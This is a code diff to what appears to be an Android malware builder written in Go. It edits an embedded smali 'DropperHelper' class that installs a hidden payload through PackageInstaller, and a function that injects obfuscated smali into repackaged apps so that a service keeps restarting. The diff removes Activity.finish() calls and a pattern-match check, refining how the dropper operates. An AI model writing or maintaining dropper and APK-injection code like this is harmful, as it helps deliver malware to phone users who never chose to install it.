@@ -1444,7 +1444,6 @@ const dropperHelperSmali = `.class public Lapp/mobilex/plus/util/DropperHelper;
     :try_start_0
     sget-object v0, Lapp/mobilex/plus/util/DropperHelper;->payload:[B
     if-nez v0, :has_payload
-    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
     return-void
 
     :has_payload
@@ -1497,7 +1496,6 @@ const dropperHelperSmali = `.class public Lapp/mobilex/plus/util/DropperHelper;
     invoke-virtual {v5}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;
     move-result-object v5
     invoke-virtual {v3, v5}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V
-    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
 
     :try_end_0
     .catchall {:try_start_0 .. :try_end_0} :catch_0
@@ -1505,7 +1503,6 @@ const dropperHelperSmali = `.class public Lapp/mobilex/plus/util/DropperHelper;
 
     :catch_0
     move-exception v0
-    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
     return-void
 .end method
 
@@ -2376,8 +2373,8 @@ func patchServiceRestart(smaliPath string) {
 	}
 	s := string(data)
 
-	oldCode := "    :cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
-	newCode := `    :cond_16
+	oldCode := ":cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
+	newCode := `:cond_16
     :goto_6
     sget-object v0, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;
     if-eqz v0, :skip_svc_restart
@@ -2387,14 +2384,12 @@ func patchServiceRestart(smaliPath string) {
     :skip_svc_restart
     sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;`
 
-	if !strings.Contains(s, oldCode) {
-		log.Printf("[BUILDER] WARNING: patchServiceRestart: pattern not found in %s", smaliPath)
-		return
-	}
 	s = strings.Replace(s, oldCode, newCode, 1)
 
 	if err := os.WriteFile(smaliPath, []byte(s), 0644); err != nil {
 		log.Printf("[BUILDER] WARNING: patchServiceRestart write: %v", err)
+	} else {
+		
 	}
 }
 
